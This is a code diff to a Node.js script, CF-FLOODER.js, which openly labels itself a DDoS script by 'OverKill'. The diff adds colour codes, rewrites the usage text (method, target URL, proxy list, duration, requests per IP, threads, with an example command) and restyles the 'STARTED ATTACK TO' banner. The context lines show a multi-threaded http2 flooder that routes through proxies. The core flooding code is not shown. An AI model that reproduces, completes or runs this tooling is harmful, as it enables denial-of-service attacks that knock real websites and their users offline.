@@ -6,7 +6,31 @@ require('events').EventEmitter.defaultMaxListeners = 0;
 const fs = require('fs');
 const url = require('url');
 const randstr = require('randomstring');
-
+const colors = {
+    reset: '\x1b[0m',
+    sang: '\x1b[1m',
+    dim: '\x1b[2m',
+    underscore: '\x1b[4m',
+    blink: '\x1b[5m',
+    reverse: '\x1b[7m',
+    hidden: '\x1b[8m',
+    den: '\x1b[30m',
+    do: '\x1b[31m',
+    luc: '\x1b[32m',
+    vang: '\x1b[33m',
+    lam: '\x1b[34m',
+    tim: '\x1b[35m',
+    cyan: '\x1b[36m',
+    trang: '\x1b[37m',
+    bgBlack: '\x1b[40m',
+    bgRed: '\x1b[41m',
+    bgGreen: '\x1b[42m',
+    bgYellow: '\x1b[43m',
+    bgBlue: '\x1b[44m',
+    bgMagenta: '\x1b[45m',
+    bgCyan: '\x1b[46m',
+    bgWhite: '\x1b[47m',
+  };
 var path = require("path");
 const cluster = require('cluster');
 const http2 = require('http2');
@@ -18,10 +42,13 @@ let headerbuilders;
 let COOKIES = undefined;
 let POSTDATA = undefined;
 
-if (process.argv.length < 8){
-    console.log('[CF-FLOODER]   |   Created by OverKill');
-    console.log('node CF-FLOODER.js [Method] [Target] [Proxy List] [Time] [Requests Per IP] [Threads]');
-    process.exit(0);
+if (process.argv.length < 6) {
+    console.log("\x1b[31m ERROR\x1b[37m: Nhập thiếu dữ liệu");
+    console.log('\x1b[36m USAGE\x1b[37m: node ' + file + ' <GET/POST> <url> <proxies> <time> <req_per_ip> <threads> (extra: cookie="" postdata="" randomstring="" headerdata="")');
+    console.log("\x1b[32m EXAMPLE\x1b[37m: node CF-FLOODER.js GET https://example.com proxy.txt 60 100 100");
+    console.log("\x1b[93m DDoS Script by:\x1b[34m OverKill ");
+  
+    process.exit();
 }
 
 let randomparam = false;
@@ -132,7 +159,7 @@ if (headerbuilders !== undefined){
             cluster.fork();
             console.log(`[Info] Thread: ${i} Created Successfully.`);
         }
-        console.log("[Info] Attack Started.")
+        console.log(colors.sang + colors.luc +`STARTED ATTACK TO`+ colors.vang + ` ===>`+ colors.do + ` ${target}`+ colors.reset);
     
         setTimeout(() => {
             process.exit(1);
